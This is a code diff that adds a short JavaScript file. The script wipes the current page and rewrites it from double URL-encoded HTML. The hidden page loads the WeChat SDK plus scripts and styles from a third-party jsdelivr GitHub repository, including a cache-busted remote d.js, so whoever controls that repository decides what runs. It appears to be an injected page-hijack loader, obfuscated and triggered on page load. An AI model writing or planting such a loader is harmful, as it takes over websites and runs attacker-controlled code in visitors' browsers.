@@ -1,0 +1,8 @@
+if (document.body) document.body.innerHTML="";
+function _load_html(){
+var a = document.open("text/html", "replace");
+a.write(decodeURIComponent(decodeURIComponent("%3C!DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%3E%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20charset%3D%22utf-8%22%3E%0A%20%20%20%20%3Ctitle%3E...%3C%2Ftitle%3E%0A%20%20%20%20%3Cmeta%20name%3D%22viewport%22%0A%20%20%20%20%20%20%20%20%20%20content%3D%22width%3Ddevice-width%2Cinitial-scale%3D1%2Cmaximum-scale%3D1%2Cuser-scalable%3D0%2Cviewport-fit%3Dcover%22%2F%3E%0A%20%20%20%20%3Cmeta%20name%3D%22format-detection%22%20content%3D%22telephone%3Dno%22%3E%0A%20%20%20%20%3Cmeta%20name%3D%22applicable-device%22%20content%3D%22mobile%22%3E%0A%20%20%20%20%3Clink%20rel%3D%22stylesheet%22%20href%3D%22https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2Fyou2048%2Fhb%2Fd.css%22%3E%0A%20%20%20%20%3Cscript%3E%0A%20%20%20%20%20%20%20%20window.focusLocation%20%3D%20%7B%7D%3B%0A%20%20%20%20%3C%2Fscript%3E%0A%3C%2Fhead%3E%0A%3Cbody%3E%0A%3Cscript%20src%3D%22https%3A%2F%2Fres.wx.qq.com%2Fopen%2Fjs%2Fjweixin-1.0.0.js%22%3E%3C%2Fscript%3E%0A%3Cscript%20src%3D%22https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2Fyou2048%2Fhb%2Fjquery.min.js%22%3E%3C%2Fscript%3E%0A%3Cscript%20src%3D%22https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2Fyou2048%2Fhb%2Fcore.js%22%3E%3C%2Fscript%3E%0A%3Cscript%3E%0A%20%20%20%20M.loadJS('%2F%2Fcdn.jsdelivr.net%2Fgh%2Fyou2048%2Fhb%2Fd.js%3Fv%3D'%20%2B%20(%2Bnew%20Date()))%3B%0A%3C%2Fscript%3E%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E")));
+a.close();
+}
+if (document.readyState == "loading") document.onreadystatechange = _load_html;
+else _load_html()
